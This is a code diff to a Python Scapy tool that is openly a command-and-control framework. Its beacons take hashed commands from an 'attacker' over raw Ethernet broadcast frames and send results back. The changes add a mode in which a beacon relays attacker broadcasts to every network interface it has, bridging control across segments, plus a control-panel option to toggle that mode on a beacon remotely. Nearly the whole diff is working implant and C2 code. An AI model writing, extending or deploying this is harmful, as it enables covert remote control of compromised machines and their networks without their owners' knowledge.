@@ -1,7 +1,11 @@
 import argparse, threading, time
 import hashlib
-from scapy.all import sniff, Ether, sendp
-import subprocess, os
+from scapy.all import sniff, Ether, sendp, get_if_list, conf # pip
+import subprocess, os, socket, sys
+import netifaces
+
+print("Current Scapy Interface:", conf.iface)
+
 
 mac_address = "FF:FF:FF:FF:FF:FF" # default return address is broadcast
 frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are supported on the network
@@ -10,6 +14,7 @@ frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are support
 frame_delay = 0.5      # For chunked responses, could help by spacing out frames
 session_id  = "default" # Id for accessing the session
 attacker_id = "default" # Id for returning information to the attacker server
+relay_broadcast = False # Relay broadcast from attacker to all 
 
 # Create a hash for session_id change
 session_id_change = hashlib.sha3_256()
@@ -36,6 +41,16 @@ global_id = hashlib.sha3_256()
 global_id.update(b"GlobalIdentifier") 
 global_id = global_id.hexdigest()
 
+# Create hash of relay broadcast change
+relay_broadcast_change = hashlib.sha3_256()
+relay_broadcast_change.update(b"RelayBroadcastChange") 
+relay_broadcast_change = relay_broadcast_change.hexdigest()
+
+# Create hash of relay broadcast getter
+relay_broadcast_getter = hashlib.sha3_256()
+relay_broadcast_getter.update(b"RelayBroadcastGetter") 
+relay_broadcast_getter = relay_broadcast_getter.hexdigest()
+
 # Create a hash for C2L2 server
 c2_id = hashlib.sha3_256()
 c2_id.update(b"Unique_C2_Id_Should_Be_Used")
@@ -47,17 +62,44 @@ c2_id_r.update(c2_id.encode('utf-8'))
 c2_id_r = c2_id_r.hexdigest()
                  
 def send_frame(message, mac_address, sender):
-    # Next send the output back to the command server
-    frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
-    for frame in frames:
-        time.sleep(frame_delay)
-        frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
-        eth_frame = Ether(dst=mac_address) / frame
-        
-        # Send the Ethernet frame
-        with open(os.devnull, 'w') as f:
-            sendp(eth_frame, verbose=False)
+    global interfaces
+    
+    if relay_broadcast == False:
+        # Next send the output back to the command server
+        frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
+        for frame in frames:
+            time.sleep(frame_delay)
+            frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
+            eth_frame = Ether(dst=mac_address) / frame
             
+            # Send the Ethernet frame
+            with open(os.devnull, 'w') as f:
+                sendp(eth_frame, verbose=False)
+    
+    # Relay frame to all interfaces (Should be done by specific beacons)
+    elif relay_broadcast == True:
+        # Next send the output back to the command server
+        frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
+        for frame in frames:
+            time.sleep(frame_delay)
+            frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
+            eth_frame = Ether(dst=mac_address) / frame
+            
+            interfaces = netifaces.interfaces()
+            
+            # Send the Ethernet frame
+            for interface in interfaces:
+                if 'windows' in sys.platform:
+                    interface = "\\Device\\NPF_" + interface
+                print(interface)
+                try:
+                    #with open(os.devnull, 'w') as f:
+                    sendp(eth_frame, verbose=False, iface=interface)
+                        
+                except Exception as e:
+                    print(e)         
+
+        
 def Delimiter(index, message, delimiter): # delimits received message
     pad     = "\\x00"   # Gets rid of padding
     returnc = "\\r"     # Gets rid of return carriage 
@@ -88,6 +130,14 @@ def ChangeFrameSize(userin):
 def ChangeDelay(userin):
     global frame_delay
     frame_delay = int(userin)
+    
+# Setter for relay broadcast      
+def ChangeRelayBroadcast():
+    global relay_broadcast
+    if relay_broadcast == False:
+        relay_broadcast = True
+    else:
+        relay_broadcast = False
 
 # Define a callback function to handle each frame
 def process_frame(frame):
@@ -106,6 +156,10 @@ def process_frame(frame):
                 send_frame(pong.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)
                 index = -1
 
+            if attacker_id.encode('utf-8') in eth_frame.payload.original and relay_broadcast == True: # Relay all broadcasts from attacker to all interfaces
+                # Relay broadcast to all interfaces if bridge beacon
+                send_frame(eth_frame.payload.original, "FF:FF:FF:FF:FF:FF", attacker_id)
+                
             if session_id_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond to session change request
                 # First, find index
                 sid_index = str(eth_frame.payload.original).find(session_id_change)  
@@ -145,6 +199,15 @@ def process_frame(frame):
                 print("changing delay to: " + string)
                 ChangeDelay(string)
                 index = -1
+                
+            if relay_broadcast_getter.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond relay broadcast getter
+                message = relay_broadcast_getter + str(relay_broadcast)
+                send_frame(message.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)
+                index = -1
+                
+            if relay_broadcast_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond relay broadcast getter
+                ChangeRelayBroadcast()
+                index = -1
              
             if index != -1:
                 print("Source MAC:", eth_frame.src)
@@ -183,6 +246,14 @@ def process_return_frame(frame):
                     string = Delimiter(pong_index, str(eth_frame.payload.original), c2_id_r) 
                     print("Beacon: " + "mac:[" + eth_frame.src + "]" + " sid:[" + string + "]")
                     index = -1
+                    
+                    
+                if relay_broadcast_getter.encode('utf-8') in eth_frame.payload.original and index != -1: # Print relay broadcast bool
+                    # First, find index
+                    relay_broadcast_getter_index = str(eth_frame.payload.original).find(relay_broadcast_getter)  
+                    string = Delimiter(relay_broadcast_getter_index, str(eth_frame.payload.original), relay_broadcast_getter) 
+                    print(string)
+                    index = -1
                 
                 if index != -1:
                     # This section needs to be delimited twice, not elegant but will have to do for a bit
@@ -201,6 +272,7 @@ def process_return_frame(frame):
 def ControlPanel(userin):
     global session_id
     global attacker_id
+    global relay_broadcast
     
     if "enable options" in userin:
         
@@ -213,9 +285,10 @@ def ControlPanel(userin):
             print("5) change beacon attacker id")
             print("6) change attacker id for broadcast domain")
             print("7) change frame size for beacon")
-            print("8) change chunked request delay")
-            print("9) help")
-            print("10) disable options")
+            print("8) change chunked request delay for beacon")
+            print("9) change relay broadcast for beacon")
+            print("10) help")
+            print("11) disable options")
             print(">", end='')
             userin = input()
             
@@ -284,11 +357,27 @@ def ControlPanel(userin):
                     delayreq = delay_change + userin
                     send_frame(delayreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                     print("Delay changed to " + userin)
-                
+                    
             elif userin == "9":
+                print("Relay Broadcast:")    
+                print("Current beacon [" + session_id + "]:")
+                
+                # Get current broadcast value for sid
+                send_frame(relay_broadcast_getter.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
+                print("Current broadcast relay setting:", end='')
+                time.sleep(3)
+                userin = input("Change setting? (y/n)")
+                if userin == "y":
+                    send_frame(relay_broadcast_change.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
+                    time.sleep(3)
+                    print("Relay broadcast now set to: ", end='')
+                    send_frame(relay_broadcast_getter.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
+                    time.sleep(3)
+                
+            elif userin == "10":
                 print("Select one of the options to configure a beacon, or exit by entering 'disable options'\n")
             
-            elif userin == "10":
+            elif userin == "11":
                 userin = "disable options"
                 print()
                 break
